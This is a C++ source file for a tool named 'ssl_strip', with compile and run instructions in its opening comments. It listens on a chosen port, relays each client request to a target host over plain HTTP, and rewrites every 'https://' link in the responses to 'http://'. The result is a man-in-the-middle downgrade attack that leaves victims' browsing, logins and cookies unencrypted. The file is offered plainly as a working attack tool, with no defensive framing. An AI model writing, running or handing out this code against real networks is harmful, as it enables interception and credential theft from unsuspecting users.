// Compile: g++ -o ssl_strip ssl_strip.cpp -lpthread
// Run: ./ssl_strip <listen_port> <target_host>
// No special privileges required

#include <iostream>
#include <cstring>
#include <string>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <netdb.h>
#include <thread>

class SSLStrip {
private:
    int listenPort;
    std::string targetHost;
    
    std::string replaceHTTPS(const std::string& data) {
        std::string result = data;
        size_t pos = 0;
        while ((pos = result.find("https://", pos)) != std::string::npos) {
            result.replace(pos, 8, "http://");
            pos += 7;
        }
        return result;
    }
    
public:
    SSLStrip(int lp, const std::string& th) : listenPort(lp), targetHost(th) {}
    
    void start() {
        int serverSock = socket(AF_INET, SOCK_STREAM, 0);
        int opt = 1;
        setsockopt(serverSock, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof(opt));
        
        struct sockaddr_in addr;
        addr.sin_family = AF_INET;
        addr.sin_addr.s_addr = INADDR_ANY;
        addr.sin_port = htons(listenPort);
        
        bind(serverSock, (struct sockaddr*)&addr, sizeof(addr));
        listen(serverSock, 10);
        
        std::cout << "SSL Strip listening on port " << listenPort << std::endl;
        
        while (true) {
            struct sockaddr_in clientAddr;
            socklen_t clientLen = sizeof(clientAddr);
            int clientSock = accept(serverSock, (struct sockaddr*)&clientAddr, &clientLen);
            
            char buffer[8192];
            int bytes = recv(clientSock, buffer, sizeof(buffer) - 1, 0);
            if (bytes <= 0) { close(clientSock); continue; }
            buffer[bytes] = '\0';
            
            // Forward to target over HTTP
            int targetSock = socket(AF_INET, SOCK_STREAM, 0);
            struct hostent* host = gethostbyname(targetHost.c_str());
            if (!host) { close(clientSock); continue; }
            
            struct sockaddr_in targetAddr;
            targetAddr.sin_family = AF_INET;
            targetAddr.sin_port = htons(80);
            memcpy(&targetAddr.sin_addr.s_addr, host->h_addr, host->h_length);
            
            if (::connect(targetSock, (struct sockaddr*)&targetAddr, sizeof(targetAddr)) == 0) {
                send(targetSock, buffer, bytes, 0);
                
                char response[8192];
                int respBytes = recv(targetSock, response, sizeof(response) - 1, 0);
                if (respBytes > 0) {
                    response[respBytes] = '\0';
                    std::string modified = replaceHTTPS(response);
                    send(clientSock, modified.c_str(), modified.length(), 0);
                }
                close(targetSock);
            }
            close(clientSock);
        }
    }
};

int main(int argc, char* argv[]) {
    if (argc != 3) { std::cerr << "Usage: " << argv[0] << " <port> <target>\n"; return 1; }
    SSLStrip strip(atoi(argv[1]), argv[2]);
    strip.start();
    return 0;
}